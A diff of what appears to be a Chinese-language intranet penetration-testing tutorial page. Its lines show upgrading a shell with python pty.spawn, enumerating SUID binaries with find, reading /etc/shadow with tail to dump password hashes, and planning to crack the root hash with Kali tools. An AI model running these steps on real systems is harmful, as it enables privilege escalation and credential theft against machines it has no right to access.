@@ -140,8 +140,12 @@
 <p>​     </p>
 <p>​             <em>现在就是已经连上来了  我们先提个权，避免5分钟后断掉连接      Python –c ‘import pty;pty.spawn(“/bin/sh”)’</em></p>
 <p><img src="http://kan.027cgb.com/613977/内网渗透/17.png"></p>
-<p>​      </p>
-<p>​        <em>使用了这个命令后 就稍微提了权   上面图片有过程  使用命令  Tail –n100 /etc/shadow</em></p>
+<p>​     </p>
+<p>​        *使用了这个命令后 就稍微提了权   上面图片有过程    </p>
+<p>使用 find / -user root -perm -4000 -print 2&gt;/dev/null   find / -perm -u=s-type f 2&gt;/dev/null   其中一个 命令   查看可执行文件</p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/50.png"></p>
+<p>tail  可以查看这些文件，用法可参考百度  搜索linux tail用法使用   Tail –n100 /etc/shadow  </p>
+<p>来查看 用户密码    </p>
 <p><img src="http://kan.027cgb.com/613977/内网渗透/18.png"></p>
 <p>​    </p>
 <p>​        <em>已经爆出来了root密码  但是它被加密了  我们复制这串密文，用kail自带的解密去破解</em></p>
